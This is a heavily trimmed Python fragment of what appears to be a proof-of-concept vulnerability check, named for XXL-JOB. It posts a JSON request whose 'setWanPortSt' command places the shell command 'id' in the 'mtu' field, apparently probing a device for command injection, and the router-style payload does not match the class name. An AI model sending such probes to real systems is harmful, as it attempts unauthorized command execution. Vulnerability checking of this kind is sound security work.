...
class XXLJOBPOC(POCBase):
    ...
    def _check(self):
        ...
        json = {"command": "setWanPortSt", "data": "hi", "mtu": "id", "port": "4", "proto": "dhcp",
                      "vlan_tagged": "1", "vlanid": "5"}
        try:
            response = requests.post(url, headers=headers, json=json, verify=False, timeout=5, allow_redirects=False)
